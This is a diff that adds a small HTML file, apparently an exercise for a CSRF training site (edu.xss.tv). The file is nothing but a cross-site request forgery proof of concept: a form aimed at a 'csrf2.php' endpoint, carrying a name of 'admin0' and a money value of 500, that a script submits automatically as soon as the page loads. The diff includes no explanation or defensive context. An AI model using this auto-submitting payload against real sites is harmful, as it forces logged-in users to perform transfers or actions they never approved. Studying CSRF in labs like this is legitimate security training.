@@ -1,0 +1,9 @@
+<html>
+    <form action="http://edu.xss.tv/payload/xss/csrf2.php" method="post">
+        <input type="name" name="name" value="admin0" />
+        <input type="money" name="money" value="500" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</html>
